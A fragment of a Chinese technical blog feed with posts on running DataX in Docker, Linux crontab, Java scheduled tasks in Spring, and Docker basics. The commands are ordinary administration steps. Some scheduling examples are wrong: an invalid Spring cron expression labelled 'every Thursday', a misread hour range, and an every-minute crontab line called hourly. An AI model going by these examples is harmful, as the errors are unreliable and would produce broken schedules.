<br>[GCC 4.8.5 20150623 (Red Hat 4.8.5-36)] on linux2<br></code></pre></td></tr></table></figure><p>接下来参考步骤 1 安装 <code>DataX</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取datax软件包</span><br>wget http://datax-opensource.oss-cn-hangzhou.aliyuncs.com/datax.tar.gz<br><span class="hljs-comment"># 创建datax目录并解压</span><br><span class="hljs-built_in">mkdir</span> /opt/datax &amp;&amp; <span class="hljs-built_in">mv</span> datax.tar.gz /opt/datax<br><span class="hljs-built_in">cd</span> /opt/datax &amp;&amp; tar zxf datax.tar.gz -C /usr/local/<br><span class="hljs-comment"># 需要删除隐藏文件 (重要)</span><br><span class="hljs-built_in">rm</span> -rf /usr/local/datax/plugin/*/._*<br></code></pre></td></tr></table></figure><p>安装完成后，创建<code>DataX</code> 配置<code>json</code> 的目录以便之后挂载，创建后退出容器；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@4696780785e2 datax]<span class="hljs-comment"># mkdir sourcetable_conf  </span><br>[root@4696780785e2 datax]<span class="hljs-comment"># exit</span><br></code></pre></td></tr></table></figure><p> <code>Commit</code> 创建新的 <code>DataX</code> 基础镜像 <code>mydatax:july</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker commit -m=<span class="hljs-string">&quot;基于jdk1.8和python2.7的datax镜像&quot;</span> 4696780785e2 mydatax:july<br></code></pre></td></tr></table></figure><p>使用以下命令挂载服务器 <code>sourcetable_conf</code>到容器<code>/opt/datax/sourcetable_conf</code> 目录，将数据同步<code>json</code> 上传至这个目录，即可在容器中进行利用 DataX 操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -d -it -v /opt/docker/datax/sourcetable_conf:/opt/datax/sourcetable_conf --name datax mydatax:july <br></code></pre></td></tr></table></figure><h3 id="4-2-jenkins-调度容器"><a href="#4-2-jenkins-调度容器" class="headerlink" title="4.2 jenkins 调度容器"></a>4.2 jenkins 调度容器</h3><p>待更新</p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux中的定时任务crontab</title>
    <link href="/2022/07/28/Linux%E4%B8%AD%E7%9A%84%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1crontab/"/>
    <url>/2022/07/28/Linux%E4%B8%AD%E7%9A%84%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1crontab/</url>
    
    <content type="html"><![CDATA[<h1 id="一、crontab-功能"><a href="#一、crontab-功能" class="headerlink" title="一、crontab 功能"></a>一、crontab 功能</h1><p>通过 <code>crontab</code> 命令，我们可以在固定的间隔时间执行指定的系统指令或 <code>shell</code> 脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常适合周期性的日志分析或数据备份等工作。</p><h1 id="二、crontab-安装"><a href="#二、crontab-安装" class="headerlink" title="二、crontab 安装"></a>二、crontab 安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## 安装crontab</span><br>yum install crontabs<br><br><span class="hljs-comment">## 启动服务</span><br>service crond start    <br><span class="hljs-comment">## 关闭服务</span><br>service crond stop    <br><span class="hljs-comment">## 重启服务</span><br>service crond restart   <br><span class="hljs-comment">## 重新载入配置</span><br>service crond reload<br><span class="hljs-comment">## 查看crontab服务状态：</span><br>service crond status<br><span class="hljs-comment">## 手动启动crontab服务：</span><br>service crond start<br><span class="hljs-comment">## 查看crontab服务是否已设置为开机启动，执行命令：</span><br>chkconfig --list<br><span class="hljs-comment">## 加入开机自动启动：</span><br>chkconfig --level 35 crond on<br></code></pre></td></tr></table></figure><h1 id="三、crontab-命令"><a href="#三、crontab-命令" class="headerlink" title="三、crontab 命令"></a>三、crontab 命令</h1><p>命令格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab [-u user] file<br>crontab [-u user] [-e|-l|-r]<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>-u user</code>：用来设定某个用户的crontab服务，例如，“-u ixdba”表示设定ixdba用户的crontab服务，此参数默认由root用户来运行；</li><li><code>file</code>：file是命令文件的名字，表示将文件 <code>file</code> 做为crontab的任务列表文件并载入crontab；</li><li><code>-e</code>：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件；</li><li><code>-l</code>：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容；</li><li><code>-r</code>：删除定时任务配置，从&#x2F;var&#x2F;spool&#x2F;cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件；</li><li><code>-i</code>：在删除用户的crontab文件时给确认提示。</li></ul><p>高频常用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -l [-u user]            <span class="hljs-comment">## 列出用户目前的crontab.</span><br>crontab -e [-u user]            <span class="hljs-comment">## 编辑用户目前的crontab.</span><br></code></pre></td></tr></table></figure><h1 id="四、调度配置"><a href="#四、调度配置" class="headerlink" title="四、调度配置"></a>四、调度配置</h1><h2 id="1-基本格式"><a href="#1-基本格式" class="headerlink" title="1. 基本格式"></a>1. 基本格式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br>  *  *  *  *  * user-name <span class="hljs-built_in">command</span> to be executed<br></code></pre></td></tr></table></figure><p>即从左至右依次为 <code>分 时 日 月 周 [用户] 命令</code> ：</p><ul><li><p>第1列表示分钟1～59 每分钟用*或者 *&#x2F;1表示</p></li><li><p>第2列表示小时0～23（0表示0点） 7-9表示：8点到10点之间</p></li><li><p>第3列表示日期1～31</p></li><li><p>第4列表示月份1～12</p></li><li><p>第5列标识号星期0～6（0表示星期天）</p></li><li><p>第6列标识执行用户（非必需）</p></li><li><p>第7列要运行的命令或 <code>shell</code> 脚本</p></li></ul><blockquote><p><strong>【扩展】</strong>相信你也发现了，<code>crontab</code> 最小只支持到分钟级别的任务执行，如果想实现秒级任务执行，我们需要借助 <code>cron表达式</code> ，该表达式使用非常广泛，在spring框架中也常用来设置定时任务的执行频率，典型应用就是 <code>@Schedule(cron)</code> 注解</p></blockquote><h2 id="2-一些配置示例"><a href="#2-一些配置示例" class="headerlink" title="2. 一些配置示例"></a>2. 一些配置示例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">*/1 * * * * <span class="hljs-built_in">date</span> &gt;&gt; /root/date.txt<br><br><span class="hljs-comment"># 上面的例子表示每分钟执行一次date命令</span><br><br>30 21 * * * /usr/local/etc/rc.d/httpd restart<br><br><span class="hljs-comment"># 上面的例子表示每晚的21:30重启apache。</span><br><br>45 4 1,10,22 * * /usr/local/etc/rc.d/httpd restart<br><br><span class="hljs-comment"># 上面的例子表示每月1、10、22日的4 : 45重启apache。</span><br><br>10 1 * * 6,0 /usr/local/etc/rc.d/httpd restart<br><br><span class="hljs-comment"># 上面的例子表示每周六、周日的1 : 10重启apache。</span><br><br>0,30 18-23 * * * /usr/local/etc/rc.d/httpd restart<br><br><span class="hljs-comment"># 上面的例子表示在每天18 : 00至23 : 00之间每隔30分钟重启apache。</span><br><br>0 23 * * 6 /usr/local/etc/rc.d/httpd restart<br><br><span class="hljs-comment"># 上面的例子表示每星期六的11 : 00 pm重启apache。</span><br><br>* */1 * * * /usr/local/etc/rc.d/httpd restart<br><br><span class="hljs-comment"># 上面的例子每一小时重启apache</span><br><br>* 23-7/1 * * * /usr/local/etc/rc.d/httpd restart<br><br><span class="hljs-comment"># 上面的例子晚上11点到早上7点之间，每隔一小时重启apache</span><br><br>0 11 4 * mon-wed /usr/local/etc/rc.d/httpd restart<br><br><span class="hljs-comment"># 上面的例子每月的4号与每周一到周三的11点重启apache</span><br><br>0 4 1 jan * /usr/local/etc/rc.d/httpd restart<br><br><span class="hljs-comment"># 上面的例子一月一号的4点重启apache</span><br></code></pre></td></tr></table></figure><h1 id="五、crontab-日志查看"><a href="#五、crontab-日志查看" class="headerlink" title="五、crontab 日志查看"></a>五、crontab 日志查看</h1><p> <code>linux</code> 中默认情况下，<code>crontab</code> 中执行的日志写在 <code>/var/log</code> 下 ；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@VM-12-14-centos]<span class="hljs-comment">#ls /var/log/cron*</span><br>/var/log/cron /var/log/cron.1 /var/log/cron.2 /var/log/cron.3 /var/log/cron.4<br></code></pre></td></tr></table></figure><p><code>crontab</code> 的日志比较简单，当然也可以将每条 <code>crontab</code> 中的任务增加自己的日志，有利于查找执行失败原因；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0 6 * * * /opt/script/test.sh &gt;&gt; /opt/script/log/mylog.log 2&gt;&amp;1                //把错误输出和标准输出都输出到mylog.log中<br></code></pre></td></tr></table></figure><p>因此查看 <code>crontab</code> 日志可以直接查看 <code>log</code> 文件信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> -f /var/log/cron       //查看最新的日志<br><span class="hljs-built_in">tail</span> -100 /var/log/cron     //查看最新的100条日志<br></code></pre></td></tr></table></figure><blockquote><p>参考文章： <a href="https://www.cnblogs.com/Transkai/p/10440904.html">Linux crontab配置</a> </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 中定时任务实现</title>
    <link href="/2022/07/27/Java%E4%B8%AD%E7%9A%84%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0/"/>
    <url>/2022/07/27/Java%E4%B8%AD%E7%9A%84%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="一、Timer"><a href="#一、Timer" class="headerlink" title="一、Timer"></a>一、Timer</h1><p><code>Timer</code> 是JAVA自带的定时任务类，实现如下： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>    <span class="hljs-comment">// 定义一个任务</span><br>    <span class="hljs-type">TimerTask</span> <span class="hljs-variable">timerTask</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TimerTask</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;打印当前时间：&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">// 计时器</span><br>    <span class="hljs-type">Timer</span> <span class="hljs-variable">timer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Timer</span>();<br>    <span class="hljs-comment">// 开始执行任务 (延迟1000毫秒执行，每3000毫秒执行一次)</span><br>    timer.schedule(timerTask, <span class="hljs-number">1000</span>, <span class="hljs-number">3000</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Timer</code> 优缺点分析：</p><ul><li>优点：使用简单；</li><li>缺点：当执行多个定时任务时，前面任务的执行用时和异常将影响到后面的任务，因此不建议使用。</li></ul><h1 id="二、ScheduledExecutorService"><a href="#二、ScheduledExecutorService" class="headerlink" title="二、ScheduledExecutorService"></a>二、<strong>ScheduledExecutorService</strong></h1><p><code>ScheduledExecutorService</code> 也是java自带的类，如果你对线程池有了解就会发现，它其实就是支持定时任务执行的线程池<code>ScheduledThreadPool</code> 。该线程池不仅可以实现<code>Timer</code> 的所有功能，还解决 <code>Timer</code> 存在的问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>    <span class="hljs-comment">// 这里采用 ThreadFactoryBuilder 创建自定义线程池</span><br>        <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">scheduledExecutorService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScheduledThreadPoolExecutor</span>(<span class="hljs-number">5</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadFactoryBuilder</span>().setNameFormat(<span class="hljs-string">&quot;example-schedule-pool-%d&quot;</span>).setDaemon(<span class="hljs-literal">true</span>).build());<br>    <span class="hljs-comment">// 执行任务，1s后开始执行，每3s执行一次</span><br>    scheduledExecutorService.scheduleAtFixedRate(() -&gt; &#123;<br>        System.out.println(<span class="hljs-string">&quot;打印当前时间：&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br>    &#125;, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, TimeUnit.SECONDS);  <br>&#125;<br></code></pre></td></tr></table></figure><p><code>ScheduledExecutorService</code> 优缺点分析：</p><ul><li>优点：使用简单，且解决了<code>Timer</code> 存在的问题，能适用于大部分场景；</li><li>缺点：只适用于单机环境，无法应用于分布式场景。</li></ul><h1 id="三、Spring-Task"><a href="#三、Spring-Task" class="headerlink" title="三、Spring Task"></a>三、Spring Task</h1><p>Spring 框架自带的定时任务， <strong>使用上面两种方式，很难实现某些特定需求，比如每周一执行某任务</strong>，但SpringTask可轻松实现。 接下来以 <code>SpringBoot</code> 举例。</p><h2 id="1-开启定时任务"><a href="#1-开启定时任务" class="headerlink" title="1. 开启定时任务"></a>1. 开启定时任务</h2><p> 在 <code>SpringBoot</code> 的启动类上声明 <code>@EnableScheduling</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@EnableScheduling</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationBoot</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(ApplicationBoot.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-添加定时任务"><a href="#2-添加定时任务" class="headerlink" title="2. 添加定时任务"></a>2. 添加定时任务</h2><p>使用 <code>@Scheduled</code> 注解配合 <code>cron</code> 表达式实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskUtils</span> &#123;    <br>    <span class="hljs-comment">// 添加定时任务    </span><br>    <span class="hljs-meta">@Scheduled(cron = &quot;30 40 23 0 0 5&quot;)</span> <span class="hljs-comment">// cron表达式：每周四 23:40:30 执行 </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doTask</span><span class="hljs-params">()</span>&#123;        <br>        System.out.println(<span class="hljs-string">&quot;周四定时任务执行...&quot;</span>);    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注解生效依赖于 <code>Spring容器</code> ，随 <code>Springboot</code> 启动后自动加载并执行定时任务。</p><h2 id="3-Cron-表达式"><a href="#3-Cron-表达式" class="headerlink" title="3. Cron 表达式"></a>3. Cron 表达式</h2><p> <code>cron</code> 表达式是由 6 位或者 7 位组成的(最后一位可以省略)，每位之间以空格分隔，每位从左到右代表的含义如下： </p><p> <img src="/../blog-assets/Java%E4%B8%AD%E7%9A%84%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0/5bdc076e79dfa867ee79fae9743731e5.png" alt="5bdc076e79dfa867ee79fae9743731e5.png"> </p><p> 其中 * 和 ? 号都表示匹配所有的时间，以下为一些常用示例：</p><p> <img src="/../blog-assets/Java%E4%B8%AD%E7%9A%84%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0/e941509e3f1ac07ebee74c70f368654f.png" alt="e941509e3f1ac07ebee74c70f368654f.png"> </p><blockquote><p><code>cron</code> 表达式在线生成： <a href="https://cron.qqe2.com/">https://cron.qqe2.com/</a> </p></blockquote><h1 id="四、分布式环境下的定时任务"><a href="#四、分布式环境下的定时任务" class="headerlink" title="四、分布式环境下的定时任务"></a>四、分布式环境下的定时任务</h1><p><a href="/2022/08/24/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB">分布式任务调度框架XXL-JOB的使用</a></p>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>七月问题汇总</title>
    <link href="/2022/07/16/%E4%B8%83%E6%9C%88%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <url>/2022/07/16/%E4%B8%83%E6%9C%88%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<ol><li>javabean中属性命名大小写问题： <a href="https://blog.csdn.net/u010744399/article/details/52523126">java中属性命名get字母大小写问题</a> </li><li>涉及group by的慢查询： <a href="https://blog.csdn.net/qq_31949853/article/details/84984305">【mysql】group by 特别慢，优化方法</a> </li><li>线程池应保证单例，不能在方法里new</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
      <category>问题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DevOps（一）长征从Docker开始</title>
    <link href="/2022/07/14/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/07/14/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<blockquote><p>docker 官方文档： <a href="https://docs.docker.com/reference/">Docker Documentation</a> </p></blockquote><h1 id="一、Docker-概述"><a href="#一、Docker-概述" class="headerlink" title="一、Docker 概述"></a>一、Docker 概述</h1><h2 id="1-何为-Docker"><a href="#1-何为-Docker" class="headerlink" title="1. 何为 Docker"></a>1. 何为 Docker</h2><p> Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的<a href="https://baike.baidu.com/item/%E9%95%9C%E5%83%8F/1574">镜像</a>中，然后发布到任何流行的 <a href="https://baike.baidu.com/item/Linux">Linux</a> 或 <a href="https://baike.baidu.com/item/Windows/165458">Windows</a> 操作系统的机器上，也可以实现<a href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E5%8C%96/547949">虚拟化</a>。容器是完全使用<a href="https://baike.baidu.com/item/%E6%B2%99%E7%AE%B1/393318">沙箱</a>机制，相互之间不会有任何接口。 </p><h2 id="2-Docker-给我们带来了什么"><a href="#2-Docker-给我们带来了什么" class="headerlink" title="2. Docker 给我们带来了什么"></a>2. Docker 给我们带来了什么</h2><ul><li><strong>更高效的利用系统资源</strong></li></ul><p>由于<strong>容器不需要进行硬件虚拟以及运行完整操作系统等额外开销</strong>，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。</p><ul><li><strong>更快速的启动时间</strong></li></ul><p>传统的虚拟机技术启动应用服务往往需要数分钟，而 Docker 容器应用，由于直接运行于宿主内核，无需启动完整的操作系统，因此可以做到秒级、甚至毫秒级的启动时间。大大的节约了开发、测试、部署的时间。</p><ul><li><strong>一致的运行环境</strong></li></ul><p>开发过程中一个常见的问题是环境一致性问题。由于开发环境、测试环境、生产环境不一致，导致有些 bug 并未在开发过程中被发现。而 Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现「这段代码在我机器上没问题啊」这类问题。</p><ul><li><strong>持续交付和部署</strong></li></ul><p>对开发和运维（<code>DevOps</code>）人员来说，最希望的就是<strong>一次创建或配置，可以在任意地方正常运行</strong>。</p><p>使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。开发人员可以通过 <code>Dockerfile</code> 来进行镜像构建，并结合持续集成（即<code>CI</code>，Continuous Integration）系统进行集成测试，而运维人员则可以直接在生产环境中快速部署该镜像，甚至结合持续部署（即<code>CD</code>，Continuous Delivery&#x2F;Deployment）系统进行自动部署。</p><p>而且使用 <code>Dockerfile</code> 使镜像构建透明化，不仅仅开发团队可以理解应用运行环境，也方便运维团队理解应用运行所需条件，帮助更好的在生产环境中部署该镜像。</p><ul><li><strong>更轻松的迁移</strong></li></ul><p>由于 Docker 确保了执行环境的一致性，使得应用的迁移更加容易。Docker 可以在很多平台上运行，无论是物理机、虚拟机、公有云、私有云，甚至是笔记本，其运行结果是一致的。因此用户可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。</p><ul><li><strong>更轻松的维护和扩展</strong></li></ul><p>Docker 使用的分层存储以及镜像的技术，使得应用重复部分的复用更为容易，也使得应用的维护更新更加简单，基于基础镜像进一步扩展镜像也变得非常简单。此外，Docker 团队同各个开源项目团队一起维护了一大批高质量的 官方镜像，既可以直接在生产环境使用，又可以作为基础进一步定制，大大的降低了应用服务的镜像制作成本。</p><h2 id="3-Docker-与-DevOps"><a href="#3-Docker-与-DevOps" class="headerlink" title="3. Docker 与 DevOps"></a>3. Docker 与 DevOps</h2><ul><li><strong>应用更快速的交付和部署</strong><ul><li>传统：一堆帮助文档，安装程序</li><li>Docker：打包镜像发布测试，一键运行</li></ul></li></ul><ul><li><strong>更便捷的升级和扩缩容</strong></li></ul><p>使用Docker之后，部署应用就和搭积木一样<br>项目打包成一个镜像，比如服务器 A 出现性能瓶颈，水平拓展，在服务器 B 上一键运行镜像</p><ul><li><strong>更简单的系统运维</strong></li></ul><p>容器化之后，开发、测试环境高度一致</p><ul><li><strong>更高效的计算资源利用</strong></li></ul><p>Docker是内核级别的虚拟化，可以在一个物理机上运行很多容器实例，服务器性能可以被压榨到极致</p><h1 id="二、Docker的组成部件"><a href="#二、Docker的组成部件" class="headerlink" title="二、Docker的组成部件"></a>二、Docker的组成部件</h1><p> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/67431da6773f92c192a9b259412c1a33.png" alt="img"> </p><h2 id="1-镜像-image"><a href="#1-镜像-image" class="headerlink" title="1. 镜像 image"></a>1. 镜像 image</h2><p>镜像就是一个只读的模板，可以<strong>通过这个模板创建容器服务</strong>，一个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器中）。</p><h2 id="2-容器-container"><a href="#2-容器-container" class="headerlink" title="2. 容器 container"></a>2. 容器 container</h2><p>Docker利用容器技术，独立运行的一个或一组应用。<strong>容器是用镜像创建的运行实例</strong>。<br>它可以被启用，开始，停止，删除。每个容器都是相互隔离的，保证安全的平台。<br>可以把容器看作是一个简易版的Linux系统(包括root用户权限，进程空间，用户空间和网络空间等)和运行在其中的应用程序。<br>容器的定义和镜像几乎一摸一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的</p><h2 id="3-仓库-repository"><a href="#3-仓库-repository" class="headerlink" title="3. 仓库 repository"></a>3. 仓库 repository</h2><ul><li><p>仓库是集中存放镜像文件的场所。</p></li><li><p>仓库和仓库注册服务器(Registry)是有区别的，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签</p></li><li><p>存放软件交付成果性产物（即制品）的仓库称为制品仓库，用以对制品进行管理（排查漏洞等）</p></li></ul><h1 id="三、Docker-安装与常用命令"><a href="#三、Docker-安装与常用命令" class="headerlink" title="三、Docker 安装与常用命令"></a>三、Docker 安装与常用命令</h1><p>该部分可参考之前的文章 <a href="/2022/06/07/docker%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/">docker环境安装</a></p><h1 id="四、Docker-的RUN流程和底层原理"><a href="#四、Docker-的RUN流程和底层原理" class="headerlink" title="四、Docker 的RUN流程和底层原理"></a>四、Docker 的RUN流程和底层原理</h1><h2 id="1-Run-流程"><a href="#1-Run-流程" class="headerlink" title="1. Run 流程"></a>1. Run 流程</h2><p><img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1657699130727.png" alt="1657699130727"></p><h2 id="2-Docker-是怎么工作的"><a href="#2-Docker-是怎么工作的" class="headerlink" title="2. Docker 是怎么工作的"></a>2. Docker 是怎么工作的</h2><ul><li><code>Docker</code> 是一个 <code>Client-Server</code> 结构的系统，<code>Docker</code>的守护进程运行在主机上，通过Socket从客户端访问</li><li><code>DockerServer</code> 接收到 <code>DockerClient</code> 的指令，就会执行这个命令</li></ul><p><img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1657699574080.png" alt="1657699574080"></p><p>从图上可以看出，在 <code>Linux</code> 服务器上面可以有一个后台守护进程，客户端访问服务器通过守护进程进行访问，然后通过命令来找到对应的 <code>Docker</code> 容器，这些容器可以看出是独立的简单 <code>Linux</code> 系统，有单独的端口号，互相隔离、互不影响。 </p><h2 id="3-Docker-为什么比-VM-快"><a href="#3-Docker-为什么比-VM-快" class="headerlink" title="3. Docker 为什么比 VM 快"></a>3. Docker 为什么比 VM 快</h2><p> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/adab94d9fb02010e8f6f6a726071573e.png" alt="image-20210124155953457"> </p><ul><li><p><code>Docker</code> 有着比虚拟机更少的抽象层，由于 <code>Docker</code> 不需要 <code>Hypervisor</code> 实现硬件资源虚拟化，运行在 <code>Docker</code> 